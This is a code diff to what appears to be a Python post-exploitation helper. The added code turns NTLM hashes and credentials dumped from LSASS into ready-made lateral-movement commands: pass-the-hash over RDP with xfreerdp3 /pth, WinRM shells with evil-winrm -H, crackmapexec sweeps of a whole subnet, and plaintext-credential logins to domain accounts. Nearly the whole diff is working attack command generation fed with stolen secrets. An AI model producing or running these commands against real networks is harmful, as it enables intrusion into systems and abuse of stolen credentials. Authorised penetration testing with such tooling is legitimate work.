@@ -162,12 +162,54 @@ def build_commands(r: dict) -> list:
             "cmd": f"impacket-wmiexec -hashes :{admin['ntlm']} {admin['user']}@<TARGET_IP>",
             "note": None
         })
+        cmds.append({
+            "label": "Pass-the-Hash — RDP (xfreerdp3)",
+            "cmd": f"xfreerdp3 /u:{admin['user']} /pth:{admin['ntlm']} /v:<TARGET_IP> /cert:ignore",
+            "note": "Requires the target to have Restricted Admin mode enabled"
+        })
+        cmds.append({
+            "label": "Pass-the-Hash — WinRM shell (evil-winrm)",
+            "cmd": f"evil-winrm -i <TARGET_IP> -u {admin['user']} -H {admin['ntlm']}",
+            "note": "Only works if WinRM (5985/5986) is open on target"
+        })
+        cmds.append({
+            "label": "Plaintext credential — RDP (xfreerdp3, local user)",
+            "cmd": f"xfreerdp3 /u:{admin['user']} /p:'<PASSWORD>' /v:<TARGET_IP> /cert:ignore",
+            "note": None
+        })
+        cmds.append({
+            "label": "Plaintext credential — WinRM shell (evil-winrm, local user)",
+            "cmd": f"evil-winrm -i <TARGET_IP> -u {admin['user']} -p '<PASSWORD>'",
+            "note": None
+        })
 
     for u in r["lsass_domain"]:
         cmds.append({
-            "label": f"Pass-the-Hash — domain user {u['domain']}\\{u['user']}",
+            "label": f"Pass-the-Hash — domain user {u['domain']}\\{u['user']} (crackmapexec)",
             "cmd": f"crackmapexec smb <SUBNET>/24 -u {u['user']} -H {u['ntlm']} -d {u['domain']}",
             "note": "Domain user hash — high value, try DC directly too"
+        })
+        cmds.append({
+            "label": f"Pass-the-Hash — domain user {u['domain']}\\{u['user']} (xfreerdp3)",
+            "cmd": f"xfreerdp3 /u:{u['user']} /d:{u['domain']} /pth:{u['ntlm']} /v:<TARGET_IP> /cert:ignore",
+            "note": "Requires Restricted Admin mode on target"
+        })
+        cmds.append({
+            "label": f"Pass-the-Hash — domain user {u['domain']}\\{u['user']} (evil-winrm)",
+            "cmd": f"evil-winrm -i <TARGET_IP> -u {u['user']} -H {u['ntlm']}",
+            "note": None
+        })
+
+    if fqdn and fqdn != "<DOMAIN>":
+        cmds.append({
+            "label": "Plaintext credential — RDP with domain (xfreerdp3)",
+            "cmd": f"xfreerdp3 /u:<USERNAME> /d:{fqdn} /p:'<PASSWORD>' /v:<TARGET_IP> /cert:ignore",
+            "note": "Use after cracking cached domain creds"
+        })
+        cmds.append({
+            "label": "Plaintext credential — WinRM with domain (evil-winrm)",
+            "cmd": f"evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -r {fqdn}",
+            "note": "Use after cracking cached domain creds; -r sets the Kerberos realm"
         })
 
     if r["cached_creds"]:
@@ -515,4 +557,3 @@ if __name__ == "__main__":
         server.serve_forever()
     except KeyboardInterrupt:
         print("\n[*] Stopped.")
-    
